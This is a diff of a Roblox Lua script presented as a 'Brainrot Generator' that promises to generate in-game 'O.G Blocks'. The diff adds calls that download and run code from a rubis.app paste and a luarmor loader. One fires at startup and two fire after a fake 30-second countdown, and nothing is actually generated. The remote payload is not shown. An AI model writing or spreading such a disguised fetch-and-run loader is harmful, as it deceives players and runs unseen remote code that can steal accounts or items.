@@ -1,148 +1,119 @@
---// Services
+--// SERVICES
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
---// ScreenGui
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "BrainrotGUI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = player:WaitForChild("PlayerGui")
+--// SCRIPT 1: BRAINROT GENERATOR
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/mIuRqkIqK9AaUqzY/raw"))()
+    
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "BrainrotGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = playerGui
 
---// Frame
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 320, 0, 180)
-Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-Frame.BackgroundColor3 = Color3.fromRGB(20,20,30)
-Frame.BorderSizePixel = 0
-Frame.Active = true
-Frame.Parent = ScreenGui
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 320, 0, 210) -- Increased height slightly for the name
+    Frame.Position = UDim2.new(0.5, -160, 0.5, -105)
+    Frame.BackgroundColor3 = Color3.fromRGB(20,20,30)
+    Frame.BorderSizePixel = 0
+    Frame.Active = true
+    Frame.Parent = ScreenGui
 
-Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 14)
+    local grad = Instance.new("UIGradient", Frame)
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(170,0,255))
+    }
 
--- Gradient
-local grad = Instance.new("UIGradient", Frame)
-grad.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(170,0,255))
-}
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1,0,0,40)
+    Title.BackgroundTransparency = 1
+    Title.Text = "Brainrot Generator"
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 20
+    Title.TextColor3 = Color3.new(1,1,1)
+    Title.Parent = Frame
 
--- Title
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1,0,0,40)
-Title.BackgroundTransparency = 1
-Title.Text = "Brainrot Generator"
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 20
-Title.TextColor3 = Color3.new(1,1,1)
-Title.Parent = Frame
+    local Button = Instance.new("TextButton")
+    Button.Size = UDim2.new(0.8,0,0,50)
+    Button.Position = UDim2.new(0.1,0,0.3,0)
+    Button.Text = "Generate O.G Blocks"
+    Button.Font = Enum.Font.GothamBold
+    Button.TextSize = 18
+    Button.TextColor3 = Color3.new(1,1,1)
+    Button.BackgroundColor3 = Color3.fromRGB(40,40,60)
+    Button.Parent = Frame
+    Instance.new("UICorner", Button).CornerRadius = UDim.new(0,10)
 
--- Credit Name
-local Credit = Instance.new("TextLabel")
-Credit.Size = UDim2.new(1,0,0,20)
-Credit.Position = UDim2.new(0,0,0,35)
-Credit.BackgroundTransparency = 1
-Credit.Text = "@VelchiScriptz@Tiktok"
-Credit.Font = Enum.Font.Gotham
-Credit.TextSize = 14
-Credit.TextColor3 = Color3.fromRGB(200,200,200)
-Credit.Parent = Frame
+    -- Draggable System
+    local dragging, dragStart, startPos
+    Frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = Frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
 
--- Button
-local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0.8,0,0,50)
-Button.Position = UDim2.new(0.1,0,0.45,0)
-Button.Text = "Generate O.G Blocks"
-Button.Font = Enum.Font.GothamBold
-Button.TextSize = 18
-Button.TextColor3 = Color3.new(1,1,1)
-Button.BackgroundColor3 = Color3.fromRGB(40,40,60)
-Button.Parent = Frame
+    -- BUTTON CLICK LOGIC
+    Button.MouseButton1Click:Connect(function()
+        if Frame:FindFirstChild("Timer") then return end
 
-Instance.new("UICorner", Button).CornerRadius = UDim.new(0,10)
+        local Timer = Instance.new("TextLabel")
+        Timer.Name = "Timer"
+        Timer.Size = UDim2.new(1,0,0,30)
+        Timer.Position = UDim2.new(0,0,0.6,0)
+        Timer.BackgroundTransparency = 1
+        Timer.Font = Enum.Font.Gotham
+        Timer.TextSize = 16
+        Timer.TextColor3 = Color3.new(1,1,1)
+        Timer.Parent = Frame
 
---// DRAG SYSTEM
-local dragging = false
-local dragStart = nil
-local startPos = nil
-local dragInput = nil
+        -- BRANDING LABEL
+        local Branding = Instance.new("TextLabel")
+        Branding.Name = "Branding"
+        Branding.Size = UDim2.new(1,0,0,30)
+        Branding.Position = UDim2.new(0,0,0.75,0)
+        Branding.BackgroundTransparency = 1
+        Branding.Text = "@VelchiScriptz@Tiktok"
+        Branding.Font = Enum.Font.GothamBold
+        Branding.TextSize = 14
+        Branding.TextColor3 = Color3.fromRGB(0, 255, 255) -- Cyan color for visibility
+        Branding.Parent = Frame
 
-local function update(input)
-	local delta = input.Position - dragStart
-	Frame.Position = UDim2.new(
-		startPos.X.Scale,
-		startPos.X.Offset + delta.X,
-		startPos.Y.Scale,
-		startPos.Y.Offset + delta.Y
-	)
-end
+        -- 30 second wait
+        for i = 30, 0, -1 do
+            Timer.Text = "Generating in... "..i.."s"
+            task.wait(1)
+        end
 
-Frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1
-	or input.UserInputType == Enum.UserInputType.Touch then
-		
-		dragging = true
-		dragStart = input.Position
-		startPos = Frame.Position
+        Timer.Text = "Generating..."
+        task.wait(5)
 
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
-end)
+        -- Clean up first GUI
+        ScreenGui:Destroy()
 
-Frame.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch then
-		dragInput = input
-	end
-end)
+        --// SCRIPT 2: EXECUTES IMMEDIATELY
+        task.spawn(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/583e63cb6b4c4b78d6a9e05560e3275b.lua"))()
+        end)
 
-UIS.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
-	or input.UserInputType == Enum.UserInputType.Touch) then
-		update(input)
-	end
-end)
+        task.wait(0.5)
 
---// SAFE LOCAL SCRIPT TO RUN AFTER LOADING
-local function RunAfterLoading()
-	print("Loading finished! Your script runs now.")
-end
-
---// BUTTON LOGIC
-Button.MouseButton1Click:Connect(function()
-	if Frame:FindFirstChild("Timer") then return end
-
-	Button.Active = false
-	Button.AutoButtonColor = false
-
-	local Timer = Instance.new("TextLabel")
-	Timer.Name = "Timer"
-	Timer.Size = UDim2.new(1,0,0,30)
-	Timer.Position = UDim2.new(0,0,0.8,0)
-	Timer.BackgroundTransparency = 1
-	Timer.Font = Enum.Font.Gotham
-	Timer.TextSize = 16
-	Timer.TextColor3 = Color3.new(1,1,1)
-	Timer.Parent = Frame
-
-	-- 20 second countdown
-	for i = 20, 1, -1 do
-		Timer.Text = "Generating in... "..i.."s"
-		task.wait(1)
-	end
-
-	Timer.Text = "Generating..."
-	task.wait(0.5)
-
-	-- Run your local code AFTER loading
-	RunAfterLoading()
-
-	-- Remove GUI
-	ScreenGui.Enabled = false
-	ScreenGui:Destroy()
+        task.spawn(function()
+            loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/mIuRqkIqK9AaUqzY/raw"))()
+        end)
+    end)
 end)
